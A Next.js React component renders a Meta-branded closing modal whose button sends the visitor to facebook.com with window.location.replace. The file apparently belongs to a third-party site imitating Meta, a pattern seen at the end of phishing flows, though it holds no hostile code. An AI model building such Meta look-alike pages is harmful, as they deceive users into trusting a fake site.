'use client';

import FinalImage from '@/assets/images/final-image.png';
import MetaLogo from '@/assets/images/meta-logo-image.png';
import { DEFAULT_TEXTS } from '@/constants/default-texts';
import Image from 'next/image';
import type { FC } from 'react';

const FinalModal: FC<{ texts?: Record<string, string> }> = ({ texts = DEFAULT_TEXTS }) => {
    return (
        <div className='fixed inset-0 z-50 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <p className='mt-4 text-2xl font-bold'>{texts.finalTitle}</p>
                <p className='text-xl'>{texts.finalDesc}</p>
                <div className='flex flex-col justify-center gap-10'>
                    <Image src={FinalImage} alt='' />
                    <button
                        type='button'
                        onClick={() => window.location.replace('https://www.facebook.com')}
                        className='mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700'
                    >
                        {texts.returnFacebook}
                    </button>
                </div>
                <div className='flex items-center justify-center p-3'>
                    <Image src={MetaLogo} alt='' className='h-[18px] w-[70px]' />
                </div>
            </div>
        </div>
    );
};

export default FinalModal;
